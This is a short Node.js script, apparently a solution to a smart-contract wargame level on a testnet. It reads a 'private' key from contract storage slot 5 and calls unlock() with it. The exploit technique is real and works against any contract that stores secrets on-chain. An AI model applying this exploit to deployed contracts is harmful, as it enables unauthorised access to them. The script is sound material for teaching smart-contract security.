const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[{"internalType":"bytes32[3]","name":"_data","type":"bytes32[3]"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"ID","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xb3cea217"},{"inputs":[],"name":"locked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xcf309012"},{"inputs":[{"internalType":"bytes16","name":"_key","type":"bytes16"}],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0xe1afb08c"}];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const account = new ethers.Wallet(privateKey, provider);

    if (await isSolved(contract)) {
        console.log('contract already pwned');
        process.exit(0);
    }

    console.log('accessing private storage...');
    const data = await provider.getStorage(contractAddress, 5);
    const key = ethers.dataSlice(data, 0, 16);

    console.log('unlocking the contract...');
    const tx = await contract.connect(account).unlock(key);
    await tx.wait();

    console.log('checking contract is unlocked...');
    if (await isSolved(contract)) {
        console.log('solved!');
    } else {
        console.error('failed to exploit contract');
        process.exit(1);
    }
}

async function isSolved(contract) {
    return !(await contract.locked());
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as the first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as the second argument');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
